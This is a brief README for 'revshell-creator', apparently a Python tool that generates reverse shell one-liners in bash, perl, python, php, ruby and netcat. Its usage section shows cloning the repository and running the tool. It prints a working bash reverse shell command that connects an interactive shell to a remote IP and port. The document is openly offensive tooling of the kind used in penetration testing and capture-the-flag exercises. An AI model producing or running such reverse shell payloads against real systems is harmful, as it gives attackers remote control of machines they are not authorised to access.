# revshell-creator
A simple multi language reverse shell generator written in python3

## usage
```
$ git clone https://github.com/parzel/revshell-creator.git
$ cd revshell-creator
$ ./revshell-creator 
Usage: ./revs-creator 10.10.10.10 1234 bash
Options: bash, perl, python, python3, php, ruby, netcat, netcat_alt
$ ./revshell-creator 10.0.0.10 1234 bash
bash -i >& /dev/tcp/10.0.0.10/1234 0>&1
```